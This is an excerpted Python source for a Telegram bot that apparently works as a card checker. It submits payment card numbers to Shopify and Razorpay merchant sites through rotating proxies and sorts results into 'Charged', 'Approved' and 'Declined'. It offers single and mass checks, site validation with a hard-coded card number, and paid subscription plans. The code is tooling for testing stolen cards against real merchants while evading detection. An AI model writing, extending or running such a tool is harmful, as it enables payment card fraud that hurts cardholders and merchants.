...
# ---- Shopify sites (renamed from sites) ----
...
# ====================== FREE USER DAILY TRACKER (unchanged) ======================
def _get_today_key():
...
# ====================== SMART ROTATION ENGINE (unchanged) ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}
        self._proxy_fails = {}
...
# ====================== ERROR DETECTION (add Razorpay site errors) ======================
SITE_ERROR_KEYWORDS = [
...
# ====================== SHOPIFY API (unchanged) ======================
def build_shopify_api_url(site, cc, proxy_data=None):
...
async def check_shopify_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_shopify_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
        ...
        result = classify_shopify_response(rj)
        result["card"] = card
        result["site"] = site
        return result
    except asyncio.TimeoutError:
...
async def test_shopify_site(site, proxy_data=None, http_session=None):
    ...
    try:
        url = build_shopify_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
...
# ====================== RAZORPAY API (with site parameter) ======================
def build_razorpay_api_url(site, cc, proxy_data=None):
    # site may be None or empty; if provided, add &site= parameter
...
def classify_razorpay_response(data):
    ...
    if any(k in resp_lower for k in ['charged', 'success', 'payment successful', 'order_paid']):
        status = "Charged"
    # Approved (e.g., insufficient funds, OTP, CVC)
    elif any(k in resp_lower for k in ['insufficient', 'otp', '3d', 'cvc', 'ccn', 'approved']):
        status = "Approved"
    # Retryable errors (network, malformed, timeout, etc.)
...
async def check_razorpay_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    """Retry on RetryError, rotate sites."""
    if not sites:
        # If no sites, still try with site=None
        sites = [None]
    tried_sites = set()
    tried_proxies = set()
    last = None
...
async def test_razorpay_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"  # same test card, you can change
    try:
        result = await check_razorpay_api(test_card, site, proxy_data, user_id=0, http_session=http_session)
        # Site is valid if we got a valid decline (not a site error)
        # The response should not contain site error indicators (like "Invalid format" is not a site error, it's a card error)
        # But if the API returns "Invalid format", that's a card format issue, not site error. So site can be valid.
        # However, if we get "Site not supported" or similar, it's invalid.
        # Our classification already sets Status "RetryError" for malformed/timeout etc.
        if result.get("Status") == "RetryError":
            return {'site': site, 'status': 'dead', 'price': '-', 'response': result.get('Response', '')[:100]}
        # Any other status (Charged, Approved, Declined) means the site accepted the request → valid
...
# ====================== MASS CHECK HELPERS (unchanged, generic) ======================
...
{PE} <b><i>{bs('Sites')}</i></b>
|   {PE} <code>/addsite</code> ━ <b>{bs('Add Shopify site')}</b>
|   {PE} <code>/addsites</code> ━ <b>{bs('Add multiple Shopify sites')}</b>
...
|   {PE} <code>/addrzsite</code> ━ <b>{bs('Add Razorpay site')}</b>
|   {PE} <code>/addrzsites</code> ━ <b>{bs('Add multiple Razorpay sites')}</b>
...
async def add_shopify_site(event):
    ...
    if await add_shopify_site_db(event.sender_id, site):
        await styled_reply(event, f"{PE} ✅ {bs('Site added')}: {site}", emoji_ids=[CE["check"]])
    else:
        await styled_reply(event, f"{PE} ❌ {bs('Failed to add site')}", emoji_ids=[CE["cross"]])
...
async def add_shopify_sites_file(event):
    ...
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    if not event.reply_to_message or not event.reply_to_message.document:
        return await styled_reply(event, f"{PE} {bs('Reply to a .txt file with sites')}", emoji_ids=[CE["info"]])
    try:
        file_info = bot.get_file(event.reply_to_message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        lines = downloaded.decode().splitlines()
    ...
    for site in sites:
        if await add_shopify_site_db(event.sender_id, site):
            added += 1
    await styled_reply(event, f"{PE} ✅ {bs('Added')} {added}/{len(sites)} {bs('sites')}", emoji_ids=[CE["check"]])
...
async def add_razorpay_site(event):
    ...
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        return await styled_reply(event, f"{PE} <code>/addrzsite your-razorpay-site.com</code>", emoji_ids=[CE["info"]])
    site = normalize_site_url(args[1])
    # Validate the site with test CC
    status_msg = await styled_reply(event, f"{PE} 🔄 {bs('Validating site...')}", emoji_ids=[CE["fire"]])
    test_card = "5154623245618097|03|2032|156"  # test CC
...
async def del_razorpay_site(event):
    ...
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        return await styled_reply(event, f"{PE} <code>/delrzsite site.com</code>", emoji_ids=[CE["info"]])
    site = normalize_site_url(args[1])
...
async def single_cc_check_shopify(event):
    ...
    if is_paid_plan(plan) or uid in ADMIN_ID:
        sites = await get_user_shopify_sites(uid); proxies = await get_all_user_proxies(uid)
    else:
        sites, proxies = [], []
        for aid in ADMIN_ID:
            sites = await get_user_shopify_sites(aid); proxies = await get_all_user_proxies(aid)
            if sites: break
        if not sites:
            try:
                sites = await get_global_sites()
            except: pass
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No Shopify sites!')} </b><code>/addsite</code>", emoji_ids=[CE["warn"]])
...
async def single_cc_check_razorpay(event):
    ...
    if is_paid_plan(plan) or uid in ADMIN_ID:
        ...
        for aid in ADMIN_ID:
            ...
            if sites: break
    if not sites:
        # If no sites, we still allow checking with site=None
        sites = [None]
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card:
...
async def mass_check_razorpay(event):
    ...
    sites = await get_user_razorpay_sites(uid)
    if not sites:
        # If no sites, we still allow with site=None (the API may work without a site)
        sites = [None]
    rotator = SmartRotator()
